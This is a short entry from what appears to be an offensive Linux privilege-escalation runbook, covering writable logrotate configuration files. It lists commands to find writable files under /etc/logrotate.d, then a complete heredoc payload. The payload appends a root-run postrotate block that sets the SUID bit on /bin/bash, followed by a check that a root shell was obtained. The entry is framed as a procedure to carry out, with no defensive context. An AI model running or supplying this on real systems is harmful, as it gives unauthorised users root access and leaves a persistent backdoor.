# LPRIV-16. Writable logrotate configuration

**Run this when:** the current user can write a file under `/etc/logrotate.d/` or can replace a configured rotation script.

```bash
ls -la /etc/logrotate.d
find /etc/logrotate.d -maxdepth 1 -type f -writable -ls 2>/dev/null
cat /etc/logrotate.conf 2>/dev/null | sed -n '1,80p'
```

**Look for:** a writable config whose rotation runs as root. A `postrotate`/`prerotate` block executes its script as the calling user; with `su root` in the config it runs as root.

**If found:** append a block to the writable file, then wait for the daily cron or force one rotation if permitted:

```bash
cat >> /etc/logrotate.d/<WRITABLE_FILE> <<'EOF'
/tmp/owb.log {
  daily
  rotate 1
  missingok
  notifempty
  su root root
  postrotate
    /bin/bash -c 'chmod u+s /bin/bash'
  endscript
}
EOF
touch /tmp/owb.log
```

Verify with `ls -l /bin/bash` and `/bin/bash -p -c id`.
